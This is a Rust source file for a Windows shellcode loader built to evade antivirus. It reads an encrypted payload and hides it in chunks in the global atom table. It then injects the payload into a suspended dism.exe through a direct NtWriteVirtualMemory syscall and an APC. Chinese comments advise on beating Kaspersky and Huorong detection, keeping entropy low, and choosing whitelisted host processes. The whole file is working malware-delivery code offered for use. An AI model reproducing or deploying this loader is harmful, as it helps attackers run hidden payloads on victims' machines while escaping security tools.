#![windows_subsystem = "windows"]

use core::ffi::c_void;
use std::fs;
use windows::{
    core::{PCSTR, PCWSTR, PWSTR},
    Win32::{
        Foundation::{BOOL, HANDLE, HWND, LPARAM, LRESULT, WPARAM, GetLastError, HMODULE},
        System::{
            LibraryLoader::{GetModuleHandleW, GetProcAddress},
            Memory::{MEM_COMMIT, MEM_RESERVE, VIRTUAL_ALLOCATION_TYPE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE},
            Threading::{
                CreateProcessW, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, STARTUPINFOW,
                WaitForSingleObject, OpenThread, ResumeThread, QueueUserAPC, THREAD_ALL_ACCESS,
            },
        },
        UI::WindowsAndMessaging::{
            CreateWindowExW, DefWindowProcW, DispatchMessageW, GetMessageW, PostQuitMessage,
            RegisterClassExW, SendMessageW, TranslateMessage, HMENU, WINDOW_EX_STYLE,
            WNDCLASSEXW, WS_OVERLAPPEDWINDOW, WM_DESTROY, WM_USER,
        },
    },
};
use std::ptr::{null, null_mut};
use std::sync::Mutex;
use lazy_static::lazy_static;
use std::thread::sleep;
use std::time::Duration;
use rand::{random, Rng};
use windows::Win32::System::Memory::PAGE_EXECUTE_READ;

type GlobalAddAtomWFn = unsafe extern "system" fn(PCWSTR) -> u16;
type GlobalGetAtomNameWFn = unsafe extern "system" fn(u16, *mut u16, i32) -> u32;
type VirtualAllocExFn = unsafe extern "system" fn(HANDLE, *const c_void, usize, VIRTUAL_ALLOCATION_TYPE, u32) -> *mut c_void;
type VirtualProtectExFn = unsafe extern "system" fn(HANDLE, *mut c_void, usize, u32, *mut u32) -> BOOL;
type NtWriteVirtualMemoryFn = unsafe extern "system" fn(HANDLE, *mut c_void, *const c_void, usize, *mut usize) -> i32;

const WM_TRIGGER_EXEC: u32 = WM_USER + 0x1984;
const CHUNK_SIZE: usize = 120;

// XOR密钥自行修改，需要与加密脚本一致
const XOR_KEY: &[u8] = b"0x5A";

fn xor_str_wide(data: &[u16], key: &[u8]) -> Vec<u16> {
    data.iter().enumerate().map(|(i, &w)| {
        let key_byte = key[i % key.len()];
        w ^ (key_byte as u16)
    }).collect()
}

fn xor_str(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter().enumerate().map(|(i, &byte)| byte ^ key[i % key.len()]).collect()
}

fn xor_decrypt(data: &mut [u8], key: &[u8]) {
    for (i, byte) in data.iter_mut().enumerate() {
        *byte ^= key[i % key.len()];
    }
}

fn random_sleep() {
    let mut rng = rand::thread_rng();
    let delay_ms = rng.gen_range(500..=1500);
    sleep(Duration::from_millis(delay_ms));
}

lazy_static! {
    static ref ENTRY_IDS: Mutex<Vec<u16>> = Mutex::new(Vec::new());
}

unsafe fn get_unhooked_function(h_module: HMODULE, fn_name: &[u8]) -> *mut c_void {
    let fn_name_enc = xor_str(fn_name, XOR_KEY);
    let proc_addr: Option<unsafe extern "system" fn() -> isize> =
        GetProcAddress(h_module, PCSTR(fn_name_enc.as_ptr()));
    match proc_addr {
        Some(addr) => addr as *mut c_void,
        None => panic!("error"),
    }
}

unsafe fn get_syscall_id(fn_name: &[u8]) -> u32 {
    let ntdll = GetModuleHandleW(PCWSTR("ntdll.dll\0".encode_utf16().collect::<Vec<u16>>().as_ptr())).expect("Failed to get ntdll handle");
    let proc_addr = GetProcAddress(ntdll, PCSTR(fn_name.as_ptr())).expect("Failed to get function address");
    let fn_ptr = proc_addr as *const u8;
    let bytes = std::slice::from_raw_parts(fn_ptr, 16);
    if bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 { // mov r10, rcx
        if bytes[3] == 0xB8 { // mov eax, <id>
            let id = u32::from_le_bytes([bytes[4], bytes[5], bytes[6], bytes[7]]);
            return id;
        }
    }
    panic!("error");
}

unsafe fn syscall_nt_write_virtual_memory(
    syscall_id: u32,
    h_process: HANDLE,
    base_addr: *mut c_void,
    buffer: *const c_void,
    size: usize,
    bytes_written: *mut usize,
) -> i32 {
    let mut status: i32 = 0;

    std::arch::asm!(
        "push rbp",
        "mov rbp, rsp",
        "sub rsp, 40",         // 影子空间 (32 字节) + 8 字节对齐
        "mov r10, rcx",        // Windows x64: rcx -> r10
        "mov [rsp + 0x20], r12", // 第五个参数放入栈中
        "syscall",             // 执行系统调用
        "mov rsp, rbp",
        "pop rbp",
        in("eax") syscall_id,
        in("rcx") h_process.0 as usize,
        in("rdx") base_addr as usize,
        in("r8") buffer as usize,
        in("r9") size,
        in("r12") bytes_written as usize,
        lateout("eax") status,
        clobber_abi("system"),
    );

    status
}

unsafe fn get_unhooked_nt_write_virtual_memory() -> NtWriteVirtualMemoryFn {
    let ntdll = GetModuleHandleW(PCWSTR("ntdll.dll\0".encode_utf16().collect::<Vec<u16>>().as_ptr())).expect("Failed to get ntdll handle");
    let fn_name = b"NtWriteVirtualMemory\0";
    let proc_addr: Option<unsafe extern "system" fn() -> isize> = GetProcAddress(ntdll, PCSTR(fn_name.as_ptr()));
    std::mem::transmute(proc_addr.expect("Failed to load NtWriteVirtualMemory"))
}

unsafe fn callback_virtual_alloc_ex(
    h_process: HANDLE,
    size: usize,
    mut callback: impl FnMut(*mut c_void),
) {
    let kernel32 = GetModuleHandleW(PCWSTR("kernel32.dll\0".encode_utf16().collect::<Vec<u16>>().as_ptr())).unwrap();
    let fn_name = b"VirtualAllocEx\0";
    let virtual_alloc_ex: VirtualAllocExFn = std::mem::transmute(GetProcAddress(kernel32, PCSTR(fn_name.as_ptr())).expect("Failed to load VirtualAllocEx"));
    let addr = virtual_alloc_ex(
        h_process,
        null(),
        size,
        VIRTUAL_ALLOCATION_TYPE(MEM_COMMIT.0 | MEM_RESERVE.0),
        PAGE_READWRITE.0,
    );
    callback(addr);
}


unsafe fn callback_virtual_protect_ex(
    h_process: HANDLE,
    base_addr: *mut c_void,
    size: usize,
    mut callback: impl FnMut(BOOL),
) {
    let kernel32 = GetModuleHandleW(PCWSTR("kernel32.dll\0".encode_utf16().collect::<Vec<u16>>().as_ptr())).unwrap();
    let fn_name = b"VirtualProtectEx\0";
    let virtual_protect_ex: VirtualProtectExFn = std::mem::transmute(GetProcAddress(kernel32, PCSTR(fn_name.as_ptr())).expect("Failed to load VirtualProtectEx"));
    let mut old_protect = 0;
    let success = virtual_protect_ex(
        h_process,
        base_addr,
        size,
        PAGE_EXECUTE_READ.0, // 修改为 RX 权限（主要是针对卡巴）
        &mut old_protect,
    );
    callback(success);
}


fn main() {
    unsafe {
        let kernel32 = GetModuleHandleW(PCWSTR("kernel32.dll\0".encode_utf16().collect::<Vec<u16>>().as_ptr()))
            .expect("Failed to get kernel32 handle");

        let add_atom_enc = xor_str(b"GlobalAddAtomW\0", XOR_KEY);
        let get_atom_enc = xor_str(b"GlobalGetAtomNameW\0", XOR_KEY);
        let global_add_atom_w: GlobalAddAtomWFn = std::mem::transmute(get_unhooked_function(kernel32, &add_atom_enc));
        let _global_get_atom_name_w: GlobalGetAtomNameWFn = std::mem::transmute(get_unhooked_function(kernel32, &get_atom_enc));

        // 可包含shellcode编译，为避免熵值过高，自行添加其他脏内容
        // let data = include_bytes!("payload_x64_encrypted.bin");

        // 文件名可自行修改
        let data = fs::read("payload_x64_encrypted.bin").unwrap();
        let data_len = data.len();

        let mut entry_ids = Vec::new();
        for (i, chunk) in data.chunks(CHUNK_SIZE).enumerate() {
            let prefix = format!("X{}", i + 1);
            let encoded_chunk: String = chunk.iter().map(|b| format!("{:02x}", b ^ 0x5A)).collect();
            let entry_name = format!("{}{}", prefix, encoded_chunk);
            let wide_entry: Vec<u16> = entry_name.encode_utf16().chain(std::iter::once(0)).collect();
            let entry_id = global_add_atom_w(PCWSTR(wide_entry.as_ptr()));
            if entry_id == 0 {
                return;
            }
            entry_ids.push(entry_id);
        }
        ENTRY_IDS.lock().unwrap().extend_from_slice(&entry_ids);

        let class_name_raw: Vec<u16> = "HiddenClass\0".encode_utf16().collect();
        let class_name_enc = xor_str_wide(&class_name_raw, XOR_KEY);
        let class_name_dec = xor_str_wide(&class_name_enc, XOR_KEY);
        let wnd_class = WNDCLASSEXW {
            cbSize: size_of::<WNDCLASSEXW>() as u32,
            lpfnWndProc: Some(window_proc),
            lpszClassName: PCWSTR(class_name_dec.as_ptr()),
            hInstance: kernel32,
            ..Default::default()
        };
        let class_atom = RegisterClassExW(&wnd_class);
        if class_atom == 0 {
            return;
        }
        random_sleep();

        let window_name_raw: Vec<u16> = "HiddenWindow\0".encode_utf16().collect();
        let window_name_enc = xor_str_wide(&window_name_raw, XOR_KEY);
        let window_name_dec = xor_str_wide(&window_name_enc, XOR_KEY);
        let hwnd = CreateWindowExW(
            WINDOW_EX_STYLE::default(),
            PCWSTR(class_name_dec.as_ptr()),
            PCWSTR(window_name_dec.as_ptr()),
            WS_OVERLAPPEDWINDOW,
            0,
            0,
            1920,
            1080,// 1*1有点过分，这样看起来正常一点
            HWND(0),
            HMENU(0),
            kernel32,
            Some(null()),
        );
        if hwnd.0 == 0 {
            return;
        }
        SendMessageW(hwnd, WM_TRIGGER_EXEC, WPARAM(data_len), LPARAM(entry_ids.len() as isize));
        let mut msg = std::mem::zeroed();
        while GetMessageW(&mut msg, HWND(0), 0, 0).0 > 0 {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
    }
}

unsafe extern "system" fn window_proc(
    hwnd: HWND,
    msg: u32,
    wparam: WPARAM,
    lparam: LPARAM,
) -> LRESULT {
    match msg {
        WM_TRIGGER_EXEC => {
            let data_size = wparam.0;
            let chunk_count = lparam.0 as usize;

            let kernel32 = GetModuleHandleW(PCWSTR("kernel32.dll\0".encode_utf16().collect::<Vec<u16>>().as_ptr()))
                .unwrap();

            let get_atom_enc = xor_str(b"GlobalGetAtomNameW\0", XOR_KEY);
            let global_get_atom_name_w: GlobalGetAtomNameWFn = std::mem::transmute(get_unhooked_function(kernel32, &get_atom_enc));

            let mut payload = Vec::with_capacity(data_size);
            let entry_ids = ENTRY_IDS.lock().unwrap();
            for i in 0..chunk_count {
                let entry_id = entry_ids[i];
                let mut buffer = [0u16; 256];
                let len = global_get_atom_name_w(entry_id, buffer.as_mut_ptr(), 256) as usize;
                if len == 0 {
                    return DefWindowProcW(hwnd, msg, wparam, lparam);
                }
                let prefix = format!("X{}", i + 1);
                let prefix_len = prefix.len();
                let mut encoded_str = String::with_capacity(len.saturating_sub(prefix_len));
                for j in prefix_len..len {
                    if buffer[j] != 0 {
                        if let Some(c) = char::from_u32(buffer[j] as u32) {
                            encoded_str.push(c);
                        }
                    }
                }
                for j in (0..encoded_str.len()).step_by(2) {
                    if j + 1 < encoded_str.len() {
                        let byte_str = &encoded_str[j..j + 2];
                        if let Ok(byte) = u8::from_str_radix(byte_str, 16) {
                            payload.push(byte ^ 0x5A);
                        }
                    }
                }
            }

            if payload.len() == data_size {
                xor_decrypt(&mut payload, XOR_KEY);

                let mut si: STARTUPINFOW = std::mem::zeroed();
                si.cb = size_of::<STARTUPINFOW>() as u32;
                si.dwFlags = windows::Win32::System::Threading::STARTF_USESHOWWINDOW;
                si.wShowWindow = windows::Win32::UI::WindowsAndMessaging::SW_HIDE.0 as u16;
                let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

                // 注入程序路径，建议为白名单程序，测试notepad/explorer被火绒扫到内存会直接挂掉，svhost和runtimebroker又太敏感。
                // 这里选用Dism来测试，程序本身作为系统修复工具，相关操作不会太敏感(就是进程有点敏感，正常不会自动运行)。
                let proc_path: Vec<u16> = "C:\\Windows\\System32\\dism.exe\0".encode_utf16().collect();
                let success = CreateProcessW(
                    PCWSTR(proc_path.as_ptr()),
                    PWSTR(null_mut()),
                    None,
                    None,
                    BOOL(0),
                    PROCESS_CREATION_FLAGS(0x00000004), // CREATE_SUSPENDED
                    None,
                    None,
                    &mut si,
                    &mut pi,
                );
                if success.0 == 0 {
                    return DefWindowProcW(hwnd, msg, wparam, lparam);
                }

                let mut base_addr: *mut c_void = null_mut();
                callback_virtual_alloc_ex(pi.hProcess, data_size, |addr| {
                    base_addr = addr;
                });
                if base_addr.is_null() {
                    windows::Win32::Foundation::CloseHandle(pi.hProcess);
                    windows::Win32::Foundation::CloseHandle(pi.hThread);
                    return DefWindowProcW(hwnd, msg, wparam, lparam);
                }

                let syscall_id = get_syscall_id(b"NtWriteVirtualMemory\0");
                let mut bytes_written = 0;
                let nt_status = syscall_nt_write_virtual_memory(
                    syscall_id,
                    pi.hProcess,
                    base_addr,
                    payload.as_ptr() as *const _,
                    data_size,
                    &mut bytes_written,
                );
                if nt_status != 0 {
                    windows::Win32::Foundation::CloseHandle(pi.hProcess);
                    windows::Win32::Foundation::CloseHandle(pi.hThread);
                    return DefWindowProcW(hwnd, msg, wparam, lparam);
                }

                let mut protect_success = BOOL(0);
                callback_virtual_protect_ex(pi.hProcess, base_addr, data_size, |success| {
                    protect_success = success;
                });
                if protect_success.0 == 0 {
                    windows::Win32::Foundation::CloseHandle(pi.hProcess);
                    windows::Win32::Foundation::CloseHandle(pi.hThread);
                    return DefWindowProcW(hwnd, msg, wparam, lparam);
                }

                let thread_handle = OpenThread(THREAD_ALL_ACCESS, BOOL(0), pi.dwThreadId).unwrap();
                let apc_result = QueueUserAPC(Some(std::mem::transmute(base_addr)), thread_handle, 0);
                if apc_result == 0 {
                    windows::Win32::Foundation::CloseHandle(pi.hProcess);
                    windows::Win32::Foundation::CloseHandle(pi.hThread);
                    windows::Win32::Foundation::CloseHandle(thread_handle);
                    return DefWindowProcW(hwnd, msg, wparam, lparam);
                }

                let resume_result = ResumeThread(thread_handle);
                if resume_result == u32::MAX {
                    windows::Win32::Foundation::CloseHandle(pi.hProcess);
                    windows::Win32::Foundation::CloseHandle(pi.hThread);
                    windows::Win32::Foundation::CloseHandle(thread_handle);
                    return DefWindowProcW(hwnd, msg, wparam, lparam);
                }

                WaitForSingleObject(thread_handle, 3000);
                windows::Win32::Foundation::CloseHandle(pi.hProcess);
                windows::Win32::Foundation::CloseHandle(pi.hThread);
                windows::Win32::Foundation::CloseHandle(thread_handle);
            }
            PostQuitMessage(0);
        }
        WM_DESTROY => {
            PostQuitMessage(0);
        }
        _ => {}
    }
    DefWindowProcW(hwnd, msg, wparam, lparam)
}
